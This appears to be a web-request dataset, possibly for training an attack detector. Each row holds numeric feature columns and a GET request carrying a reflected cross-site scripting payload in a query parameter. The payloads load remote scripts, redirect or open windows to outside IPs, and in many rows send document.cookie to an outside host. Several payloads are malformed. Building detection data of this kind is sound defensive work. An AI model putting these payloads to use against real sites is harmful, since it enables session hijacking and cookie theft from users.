80,1,200,7138,7,28,17,6,2,GET /?p=<script><script+src="http://164.166.25.219/230750.js=></script> HTTP/1.1
81,1,200,7669,7,38,14,5,2,GET /?file=<script>window.location.href="http://139.231.186.92"</script> HTTP/1.1
82,1,200,7554,8,30,16,6,2,GET /?file=<script>%window.open('http://69.242.152.118/149608')3C/script> HTTP/1.1
77,1,200,2464,8,27,16,6,2,GET /?p=<script>%window.open('http://217.71.121.66/96431')3C/script> HTTP/1.1
83,1,200,6874,7,31,17,6,2,GET /?file=<script><script+src="http://114.215.24.236/152913.js=></script> HTTP/1.1
84,1,200,6158,7,33,17,6,2,GET /?search=<script><script+src="http://152.217.40.132/78232.js=></script> HTTP/1.1
102,1,200,2265,7,56,19,6,2,GET /?search=<script>window.location='http://166.80.82.100/?cookie='+document.cookie</script> HTTP/1.1
79,1,200,4955,8,27,16,6,2,GET /?p=<script>%window.open('http://148.146.88.188/461524')3C/script> HTTP/1.1
80,1,200,4285,7,38,14,5,2,GET /?name=<script>window.location.href="http://71.28.104.158"</script> HTTP/1.1
82,1,200,6807,7,38,14,5,2,GET /?file=<script>window.location.href="http://162.141.128.105"</script> HTTP/1.1
85,1,200,6072,8,32,16,6,2,GET /?search=<script>%window.open('http://244.254.163.138/623504')3C/script> HTTP/1.1
83,1,200,7095,8,30,16,6,2,GET /?name=<script>%window.open('http://110.156.209.200/464198')3C/script> HTTP/1.1
85,1,200,5514,7,33,17,6,2,GET /?search=<script><script+src="http://84.246.234.132/135438.js=></script> HTTP/1.1
100,1,200,7114,7,54,19,6,2,GET /?name=<script>window.location='http://200.36.14.247/?cookie='+document.cookie</script> HTTP/1.1
101,1,200,5908,7,54,19,6,2,GET /?file=<script>window.location='http://238.88.220.218/?cookie='+document.cookie</script> HTTP/1.1
79,1,200,6379,7,38,14,5,2,GET /?file=<script>window.location.href="http://2.166.159.37"</script> HTTP/1.1
82,1,200,2148,8,32,16,6,2,GET /?search=<script>%window.open('http://183.71.214.3/179346')3C/script> HTTP/1.1
79,1,200,5277,8,27,16,6,2,GET /?p=<script>%window.open('http://147.113.83.172/881346')3C/script> HTTP/1.1
99,1,200,5329,7,54,19,6,2,GET /?file=<script>window.location='http://118.26.61.70/?cookie='+document.cookie</script> HTTP/1.1
99,1,200,6231,7,54,19,6,2,GET /?file=<script>window.location='http://234.89.44.61/?cookie='+document.cookie</script> HTTP/1.1
101,1,200,6547,7,54,19,6,2,GET /?file=<script>window.location='http://200.28.155.120/?cookie='+document.cookie</script> HTTP/1.1
99,1,200,7753,7,56,19,6,2,GET /?search=<script>window.location='http://243.54.0.8/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,5004,8,30,16,6,2,GET /?name=<script>%window.open('http://116.210.120.39/60449')3C/script> HTTP/1.1
97,1,200,1752,7,51,19,6,2,GET /?p=<script>window.location='http://66.185.252.46/?cookie='+document.cookie</script> HTTP/1.1
76,1,200,5307,8,27,16,6,2,GET /?p=<script>%window.open('http://48.38.44.98/782201')3C/script> HTTP/1.1
80,1,200,5181,7,38,14,5,2,GET /?name=<script>window.location.href="http://120.96.98.113"</script> HTTP/1.1
75,1,200,4807,8,27,16,6,2,GET /?p=<script>%window.open('http://116.44.4.7/170587')3C/script> HTTP/1.1
98,1,200,5102,7,51,19,6,2,GET /?p=<script>window.location='http://134.70.214.164/?cookie='+document.cookie</script> HTTP/1.1
104,1,200,4214,7,56,19,6,2,GET /?search=<script>window.location='http://143.222.121.204/?cookie='+document.cookie</script> HTTP/1.1
84,1,200,7201,7,33,17,6,2,GET /?search=<script><script+src="http://77.205.119.89/218732.js=></script> HTTP/1.1
79,1,200,7307,7,38,14,5,2,GET /?file=<script>window.location.href="http://46.67.166.53"</script> HTTP/1.1
102,1,200,6451,7,56,19,6,2,GET /?search=<script>window.location='http://139.110.90.60/?cookie='+document.cookie</script> HTTP/1.1
101,1,200,4148,7,54,19,6,2,GET /?name=<script>window.location='http://160.48.181.180/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,1700,7,35,14,5,2,GET /?p=<script>window.location.href="http://131.150.67.213"</script> HTTP/1.1
81,1,200,3249,7,40,14,5,2,GET /?search=<script>window.location.href="http://25.135.1.154"</script> HTTP/1.1
84,1,200,1210,7,31,17,6,2,GET /?file=<script><script+src="http://190.190.233.135/123303.js=></script> HTTP/1.1
102,1,200,4202,7,56,19,6,2,GET /?search=<script>window.location='http://101.86.131.89/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,7161,8,30,16,6,2,GET /?file=<script>%window.open('http://201.37.52.103/877354')3C/script> HTTP/1.1
103,1,200,5466,7,56,19,6,2,GET /?search=<script>window.location='http://191.151.212.41/?cookie='+document.cookie</script> HTTP/1.1
79,1,200,7644,7,35,14,5,2,GET /?p=<script>window.location.href="http://168.255.151.202"</script> HTTP/1.1
99,1,200,1899,7,54,19,6,2,GET /?name=<script>window.location='http://5.15.189.223/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,5185,7,40,14,5,2,GET /?search=<script>window.location.href="http://115.191.198.92"</script> HTTP/1.1
80,1,200,2725,7,28,17,6,2,GET /?p=<script><script+src="http://56.157.130.181/802769.js=></script> HTTP/1.1
77,1,200,1958,8,27,16,6,2,GET /?p=<script>%window.open('http://84.59.20.240/813757')3C/script> HTTP/1.1
82,1,200,7160,7,31,17,6,2,GET /?name=<script><script+src="http://38.255.197.60/104257.js=></script> HTTP/1.1
100,1,200,3969,7,54,19,6,2,GET /?file=<script>window.location='http://129.144.118.2/?cookie='+document.cookie</script> HTTP/1.1
103,1,200,1562,7,56,19,6,2,GET /?search=<script>window.location='http://11.149.169.109/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,5019,7,40,14,5,2,GET /?search=<script>window.location.href="http://52.8.202.141"</script> HTTP/1.1
101,1,200,4723,7,54,19,6,2,GET /?file=<script>window.location='http://45.164.171.113/?cookie='+document.cookie</script> HTTP/1.1
84,1,200,2550,7,33,17,6,2,GET /?search=<script><script+src="http://247.206.232.54/39536.js=></script> HTTP/1.1
78,1,200,7884,7,35,14,5,2,GET /?p=<script>window.location.href="http://28.157.114.239"</script> HTTP/1.1
83,1,200,1327,7,33,17,6,2,GET /?search=<script><script+src="http://90.181.65.190/56754.js=></script> HTTP/1.1
100,1,200,4623,7,54,19,6,2,GET /?file=<script>window.location='http://229.70.26.143/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,4540,7,33,17,6,2,GET /?search=<script><script+src="http://89.20.76.227/376852.js=></script> HTTP/1.1
77,1,200,4079,7,28,17,6,2,GET /?p=<script><script+src="http://65.44.36.167/45645.js=></script> HTTP/1.1
102,1,200,1476,7,56,19,6,2,GET /?search=<script>window.location='http://131.136.78.92/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,7495,7,28,17,6,2,GET /?p=<script><script+src="http://212.33.3.134/957539.js=></script> HTTP/1.1
79,1,200,4982,7,38,14,5,2,GET /?name=<script>window.location.href="http://250.13.120.9"</script> HTTP/1.1
82,1,200,1570,8,32,16,6,2,GET /?search=<script>%window.open('http://63.115.254.9/265590')3C/script> HTTP/1.1
82,1,200,2919,7,31,17,6,2,GET /?file=<script><script+src="http://189.95.210.31/413274.js=></script> HTTP/1.1
103,1,200,2146,7,56,19,6,2,GET /?search=<script>window.location='http://153.18.106.180/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,4965,7,40,14,5,2,GET /?search=<script>window.location.href="http://51.141.147.34"</script> HTTP/1.1
83,1,200,4166,8,32,16,6,2,GET /?search=<script>%window.open('http://73.182.101.16/253076')3C/script> HTTP/1.1
81,1,200,6920,7,38,14,5,2,GET /?name=<script>window.location.href="http://197.66.225.121"</script> HTTP/1.1
79,1,200,1307,7,28,17,6,2,GET /?p=<script><script+src="http://46.76.175.187/679439.js=></script> HTTP/1.1
101,1,200,2227,7,56,19,6,2,GET /?search=<script>window.location='http://72.0.117.234/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,3551,7,38,14,5,2,GET /?file=<script>window.location.href="http://119.78.168.165"</script> HTTP/1.1
82,1,200,1331,8,32,16,6,2,GET /?search=<script>%window.open('http://49.70.54.150/660027')3C/script> HTTP/1.1
80,1,200,2644,7,28,17,6,2,GET /?p=<script><script+src="http://189.235.43.111/467967.js=></script> HTTP/1.1
98,1,200,1472,7,54,19,6,2,GET /?name=<script>window.location='http://25.153.64.1/?cookie='+document.cookie</script> HTTP/1.1
84,1,200,5382,7,31,17,6,2,GET /?name=<script><script+src="http://185.112.169.100/935893.js=></script> HTTP/1.1
83,1,200,7895,7,33,17,6,2,GET /?search=<script><script+src="http://153.51.66.13/153578.js=></script> HTTP/1.1
98,1,200,5644,7,54,19,6,2,GET /?name=<script>window.location='http://19.7.238.62/?cookie='+document.cookie</script> HTTP/1.1
101,1,200,7929,7,54,19,6,2,GET /?name=<script>window.location='http://108.10.130.234/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,6428,8,30,16,6,2,GET /?name=<script>%window.open('http://116.150.213.73/810454')3C/script> HTTP/1.1
83,1,200,2005,8,30,16,6,2,GET /?name=<script>%window.open('http://129.211.200.148/179234')3C/script> HTTP/1.1
83,1,200,1263,8,30,16,6,2,GET /?name=<script>%window.open('http://197.209.150.169/486916')3C/script> HTTP/1.1
101,1,200,1358,7,56,19,6,2,GET /?search=<script>window.location='http://12.219.6.114/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,2749,7,54,19,6,2,GET /?name=<script>window.location='http://84.116.84.204/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,5358,7,28,17,6,2,GET /?p=<script><script+src="http://111.173.134.109/256952.js=></script> HTTP/1.1
83,1,200,3961,8,30,16,6,2,GET /?file=<script>%window.open('http://219.253.198.171/638571')3C/script> HTTP/1.1
83,1,200,7930,7,40,14,5,2,GET /?search=<script>window.location.href="http://155.251.79.198"</script> HTTP/1.1
84,1,200,1947,7,31,17,6,2,GET /?name=<script><script+src="http://251.247.151.109/288323.js=></script> HTTP/1.1
82,1,200,1872,8,30,16,6,2,GET /?name=<script>%window.open('http://169.85.122.185/751461')3C/script> HTTP/1.1
81,1,200,1381,7,33,17,6,2,GET /?search=<script><script+src="http://44.9.12.49/114032.js=></script> HTTP/1.1
81,1,200,2115,8,30,16,6,2,GET /?file=<script>%window.open('http://149.222.27.50/264688')3C/script> HTTP/1.1
84,1,200,2324,7,40,14,5,2,GET /?search=<script>window.location.href="http://194.130.146.211"</script> HTTP/1.1
78,1,200,1954,8,27,16,6,2,GET /?p=<script>%window.open('http://248.228.231.2/940781')3C/script> HTTP/1.1
